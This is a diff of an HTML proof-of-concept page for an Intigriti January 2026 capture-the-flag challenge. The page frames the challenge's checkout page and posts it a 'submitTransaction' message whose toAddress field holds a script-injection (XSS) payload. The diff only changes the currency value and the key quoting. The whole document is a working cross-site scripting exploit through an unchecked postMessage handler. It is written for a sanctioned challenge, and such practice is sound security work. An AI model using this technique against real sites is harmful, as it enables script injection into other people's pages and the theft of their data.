@@ -1,17 +1,17 @@
 <title>Intigriti Jan 2026 PoC</title>
 <h1>Intigriti Jan 2026 PoC</h1>
 <div></div>
-<iframe id="pmtframe" src="https://challenge-0126.intigriti.io/checkout.html?currency=XMR&price=150"></iframe>
+<iframe id="pmtframe" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=150"></iframe>
 <script>
 setTimeout(() => {
 console.log("Waited for 1 second");
 }, 1000);
 document.getElementById('pmtframe').contentWindow.postMessage({
-        "type": 'submitTransaction',
-        "transaction": {
-        "toAddress": "<script>alert(${FLAG})<\/script>",
-        "currency": "XMR",
-        "amount": "1.00000000"
+        type: 'submitTransaction',
+        transaction: {
+        toAddress: "<script>alert(${FLAG})<\/script>",
+        currency: "1337COIN",
+        amount: "1.00000000"
         }
 }, '*');
 </script>
